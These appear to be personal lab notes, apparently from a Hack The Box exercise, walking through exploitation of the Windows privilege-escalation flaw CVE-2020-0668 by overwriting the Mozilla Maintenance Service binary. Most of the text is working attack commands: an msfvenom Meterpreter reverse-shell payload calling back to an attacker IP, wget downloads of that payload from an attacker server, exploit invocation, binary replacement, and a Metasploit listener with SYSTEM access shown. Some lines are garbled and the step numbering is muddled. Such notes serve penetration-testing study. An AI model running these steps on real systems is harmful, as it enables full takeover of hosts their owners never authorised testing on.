## CVE-2020-0668  Kernal priv-esc

 [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/)
### IMPACT: Privilege Escalation
 - The exploit may allow us to replace binaries/dlls for highly privileged services that we dont have access to.
  we could replace the binary file for a  **highly privileged service such as the Mozilla maintenance service**. which runs as system

## Requirements: 
1. CVE script
2. find service running as system that can be started by unprivileged users. (like mozilia maintence)
### techniques available: 2
- highly privileged service binary thats not in system32 (mozilia maintenance)
- system32 file but this requires chaining with other exploits
### Discovery:
1. with wes-ng
2. manual
`check patch level`
```cmd-session
wmic qfe list brief
				InstalledOn 
```
`We can search for each KB to get a better idea of what fixes have been installed and how far behind the system may be on security updates.`

###  technique 1: replace highly privileged service binary.
Some third-party services can be abused for escalation if they run as **SYSTEM** and are startable by unprivileged users.
### technique steps:
1. copy a payload with same name as service binary twice eg vsrv1.exe and another copy with the rename to vsrv2.exe
2. run cve 0866 and point it to first malicious exe.
3. check if succesful with icalcs (shows `F`) to the legit service location.
4. replace the 1.exe with the second 2.exe
5. 
### requirements
Example: **Mozilla Maintenance Service**
- Service runs as **SYSTEM**.
- Startable by unprivileged users.
- Binary location (not system-protected):  
`C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. 
#### pre-exploitation
 1. Checking Permissions on Binary
`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)` in the command output.
```cmd-session
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

                                                                          BUILTIN\Users:(I)(RX)
```


 2. generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.
#msfvenom
```shell
# generate
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
----------------------------------------------------
# serve
python3 -m http.server 8080
```

3.  Downloading the Malicious Binary twice 
- For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.
- We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\vipa0z\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. 
```powershell
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe

wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

4. run exploit to replace with first exe
```cmd-session
CVE-2020-0668.exe <C:\path-to-attcker-exe>/maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
#### 5. Checking Permissions of New File

- The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\vipa0z:(F)`. 
- This means that our vipa0z user has full control over the maintenanceservice.exe binaryPS C:\htb> systeminfo
, and we can overwrite it with a non-corrupted version of our malicious binary.
```cmd-session
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
                                                                          WINLPE-WS02\vipa0z:(F)
```

##### 6. replace first `msservice1.exe` with second exe `msservice2.exe`
```cmd-session
C:\htb> copy /Y C:\Users\vipa0z\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.

```
5. prepare reverse shell listener (netcat or meterpreter)

PS C:\htb> systeminfo
```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```
using meterpreter with a handler.rc "resource script" that is executed when u run metaspl
`Launching Metasploit with Resource Script`
```shell-session
 sudo msfconsole -r handler.rc 
```
start the service
```cmd-session
net start MozillaMaintenance 
```
`Ignore the error`

```
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```
---
## technique 2 (chaining)
If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges.
#### impact:
d **create a file of our choosing or replace legit files** in a protected folder such as: `C:\Windows\System32`. but this requires chaining with another CVE.
1. for the first technique: chaining with other exploits: Since this exploit only gives us privileged file write, we must chain it with another vulnerability to replace system protected files
### Common Chaining Techniques

- **Limitation for 1st method:**  the exploit overwrites a dll inside system32 but We **cannot overwrite protected Windows files** directly. so we much chain
1. **UsoDllLoader**  
 - Loads malicious DLLs through Windows Update Orchestrator.  
 - Limitation: may not work if **Windows Updates are pending** or **currently installing**.  
 - Repo: [UsoDllLoader](https://github.com/itm4n/UsoDllLoader)
2. **DiagHub Service**  
 - DLL loading via Diagnostics Hub.  
 - Limitation: diaghub Service may not be available on all systems.    may not work if Windows Updates are pending or currently being installed
 - Repo: [DiagHub](https://github.com/xct/diaghub)